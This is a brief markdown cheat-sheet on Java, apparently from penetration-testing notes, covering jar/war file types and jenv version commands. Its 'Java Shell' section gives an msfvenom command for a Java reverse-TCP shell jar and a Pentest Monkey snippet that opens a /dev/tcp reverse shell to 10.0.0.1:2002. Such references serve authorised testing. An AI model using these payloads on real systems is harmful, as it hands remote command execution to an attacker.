# Java


File types:
```bash
# Java Archive format
$file.jar	
# Web Application Resource
# Or Web application ARchive
# Contains: JAR, Javaserver pages, Java Servblets, Java classes, XML files.
$file.war    
unzip $file.war    
```

#### Virtual Environment

[Java Virtual Environment Jenv](https://medium.com/@bhagavathidhass/virtual-environments-for-python-ruby-and-java-87743478ae38):
```bash
jenv versions # shows all the jenv added versions  
jenv global oracle64-1.6.0.39 # Configure global version  
jenv local oracle64-1.6.0.39 # Configure local version (per directory)  
jenv shell oracle64-1.6.0.39 # Configure shell instance version
```

## Java Shell

```bash
msfvenom --platform java -p java/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f jar -o rev.jar
```

Pentest Monkey
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## References

[Java Virtual Environment Jenv](https://medium.com/@bhagavathidhass/virtual-environments-for-python-ruby-and-java-87743478ae38)